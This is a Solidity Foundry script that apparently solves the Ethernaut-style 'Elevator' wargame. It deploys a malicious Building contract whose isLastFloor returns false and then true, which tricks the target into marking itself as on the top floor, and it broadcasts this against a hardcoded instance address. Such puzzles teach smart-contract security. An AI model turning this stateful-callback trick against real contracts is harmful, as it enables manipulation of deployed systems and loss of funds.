// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "../lib/forge-std/src/Script.sol";
import {Elevator, Building} from "../src/Elevator.sol";

contract Apartment is Building {
    uint256 public counter;

    function isLastFloor(uint256) external returns (bool) {
        if (counter == 0) {
            counter += 1;
            return false;
        } else {
            return true;
        }
    }

    function callElevatorGoTo(uint256 floor, Elevator elevator) public {
        elevator.goTo(floor);
    }
}

contract ElevatorScript is Script {
    Elevator public elevator;
    Apartment public apartment;
    address public constant ELEVATOR_INSTANCE_ADDRESS = 0x45E9EaFE14558d3196Da510359d9B660e28f49d4;

    function run() public {
        elevator = Elevator(ELEVATOR_INSTANCE_ADDRESS);
        changeElevatorTopToTrue();
    }

    function changeElevatorTopToTrue() public {
        vm.startBroadcast();
        apartment = new Apartment();
        apartment.callElevatorGoTo(10, elevator);
        vm.stopBroadcast();
    }
}
